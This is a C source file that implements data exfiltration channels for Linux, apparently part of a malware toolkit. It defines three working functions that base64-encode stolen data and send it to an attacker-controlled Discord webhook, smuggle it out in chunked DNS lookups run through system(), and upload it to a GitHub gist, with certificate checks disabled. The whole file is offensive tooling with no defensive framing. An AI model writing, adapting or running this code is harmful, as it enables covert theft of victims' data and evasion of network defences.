/* Linux data exfiltration channel implementations */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <curl/curl.h>

static char* base64_encode(const uint8_t* data, int32_t size) {
    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int out_len = ((size + 2) / 3) * 4;
    char* out = (char*)malloc(out_len + 1);
    if (!out) return NULL;
    int i = 0, j = 0;
    while (i < size) {
        uint32_t a = (i < size) ? (uint8_t)data[i++] : 0;
        uint32_t b = (i < size) ? (uint8_t)data[i++] : 0;
        uint32_t c = (i < size) ? (uint8_t)data[i++] : 0;
        uint32_t triple = (a << 16) | (b << 8) | c;
        out[j++] = b64[(triple >> 18) & 0x3F];
        out[j++] = b64[(triple >> 12) & 0x3F];
        out[j++] = b64[(triple >>  6) & 0x3F];
        out[j++] = b64[ triple        & 0x3F];
    }
    for (int k = 0; k < (3 - size % 3) % 3; k++) out[out_len - 1 - k] = '=';
    out[out_len] = '\0';
    return out;
}

bool jocky_exfil_discord(const char* webhook, int8_t* data, int32_t size) {
    if (!webhook || !data || size <= 0) return false;

    char* b64 = base64_encode((const uint8_t*)data, size);
    if (!b64) return false;

    char* json = (char*)malloc(strlen(b64) + 32);
    if (!json) { free(b64); return false; }
    snprintf(json, strlen(b64) + 32, "{\"content\":\"%s\"}", b64);
    free(b64);

    CURL* curl = curl_easy_init();
    if (!curl) { free(json); return false; }

    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, webhook);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

    CURLcode res = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(json);

    return res == CURLE_OK;
}

bool jocky_exfil_dns(const char* domain, int8_t* data, int32_t size) {
    if (!domain || !data || size <= 0) return false;

    char* b64 = base64_encode((const uint8_t*)data, size);
    if (!b64) return false;

    const int chunk = 50;
    bool ok = true;
    for (int i = 0; b64[i] && ok; i += chunk) {
        char fqdn[512];
        char chunk_buf[chunk + 1];
        strncpy(chunk_buf, b64 + i, chunk);
        chunk_buf[chunk] = '\0';
        for (int k = 0; chunk_buf[k]; k++) {
            if (chunk_buf[k] == '+') chunk_buf[k] = '-';
            if (chunk_buf[k] == '/') chunk_buf[k] = '_';
            if (chunk_buf[k] == '=') chunk_buf[k] = '0';
        }
        snprintf(fqdn, sizeof(fqdn), "nslookup %s.%s >/dev/null 2>&1", chunk_buf, domain);
        ok = (system(fqdn) == 0);
    }

    free(b64);
    return ok;
}

bool jocky_exfil_github(const char* token, const char* repo, int8_t* data, int32_t size) {
    if (!token || !repo || !data || size <= 0) return false;

    char* b64 = base64_encode((const uint8_t*)data, size);
    if (!b64) return false;

    size_t json_len = strlen(b64) + 64;
    char* json = (char*)malloc(json_len);
    if (!json) { free(b64); return false; }
    snprintf(json, json_len, "{\"files\":{\"d.txt\":{\"content\":\"%s\"}}}", b64);
    free(b64);

    char url[512];
    snprintf(url, sizeof(url), "https://api.github.com/gists/%s", repo);

    char auth_hdr[256];
    snprintf(auth_hdr, sizeof(auth_hdr), "Authorization: token %s", token);

    CURL* curl = curl_easy_init();
    if (!curl) { free(json); return false; }

    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, auth_hdr);
    headers = curl_slist_append(headers, "X-GitHub-Api-Version: 2022-11-28");

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PATCH");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

    CURLcode res = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(json);

    return res == CURLE_OK;
}
